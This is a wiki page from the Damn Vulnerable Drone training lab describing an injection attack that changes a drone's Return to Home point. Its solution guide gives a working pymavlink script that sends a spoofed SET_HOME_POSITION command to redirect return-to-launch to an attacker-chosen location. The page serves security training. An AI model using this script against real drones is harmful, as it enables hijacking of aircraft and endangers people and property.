

<i>Override the Return to Home (RTH) point of the drone using pymavlink.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Change Return to Home Point

# Description

Changing the Return to Home (RTH) point of a drone involves sending the `SET_HOME_POSITION` command to update the coordinates used by the drone when executing Return-to-Launch (RTL) or failsafe behaviors. If an attacker can spoof this command while the drone is armed or flying, it can silently redirect the RTH behavior to an unintended location — for example, **an attacker-controlled landing zone**.

This injection attack targets the drone’s internal navigation logic rather than external telemetry, making it a particularly stealthy method to influence mission outcome.

# Resources

- <a href="https://pypi.org/project/pymavlink/">pymavlink</a>  
- <a href="https://mavlink.io/en/messages/common.html#SET_HOME_POSITION">MAVLink: SET_HOME_POSITION</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install pymavlink</h3>
<pre><code class="code mb-3 mt-3">pip install pymavlink
</code></pre>

---

<h3>Step 2. Create the Override Script</h3>
<p>Save the following as <code>set_home_override.py</code> and replace the target coordinates/IP with your own.</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil

# Replace with your connection string (e.g., tcp:10.13.0.3:5760)
connection_string = 'udp:127.0.0.1:14550'

# Connect to the vehicle
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("[+] Connected to drone")

# Define the new home position (latitude, longitude, altitude)
latitude = -35.363261      # Degrees
longitude = 149.165230     # Degrees
altitude = 584             # Meters

# Convert to MAVLink-compatible format
lat = int(latitude * 1e7)
lon = int(longitude * 1e7)
alt = int(altitude * 1000)  # mm

# Send SET_HOME_POSITION command
master.mav.set_home_position_send(
    target_system=master.target_system,
    latitude=lat,
    longitude=lon,
    altitude=alt,
    x=0, y=0, z=0,           # Not used
    q=[0, 0, 0, 0],          # Orientation (ignored)
    approach_x=0,
    approach_y=0,
    approach_z=0
)

print(f"[!] New home set: lat={latitude}, lon={longitude}, alt={altitude}m")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<pre><code class="code mb-3 mt-3">sudo python3 set_home_override.py</code></pre>

---

<h3>Step 4. Monitor for Changes</h3>
<ul>
  <li>Use <code>RTL</code> in QGroundControl and watch the drone’s new home heading</li>
  <li>Check <code>HOME_POSITION</code> messages in MAVProxy: <code>status text</code> or <code>param show</code></li>
</ul>


</details>
